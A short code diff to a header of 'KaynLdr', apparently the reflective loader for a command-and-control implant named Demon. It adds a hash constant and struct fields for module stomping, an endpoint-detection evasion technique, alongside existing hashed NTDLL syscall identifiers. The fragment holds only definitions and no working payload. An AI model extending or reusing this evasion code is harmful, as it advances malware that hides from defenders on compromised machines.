@@ -9,7 +9,7 @@ VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWO
 #define PAGE_SIZE                       4096
 #define MemCopy                         __builtin_memcpy
 #define NTDLL_HASH                      0x70e61753
-
+#define STOMPED_HASH                    0xd2ad37e8
 #define SYS_LDRLOADDLL                  0x9e456a43
 #define SYS_NTALLOCATEVIRTUALMEMORY     0xf783b8ec
 #define SYS_NTPROTECTEDVIRTUALMEMORY    0x50e92888
@@ -64,6 +64,8 @@ typedef struct
 #pragma pack(1)
 typedef struct
 {
+    PVOID StompedAddress;
+    DWORD StompedSize;
     PVOID KaynLdr;
     PVOID DllCopy;
     PVOID Demon;
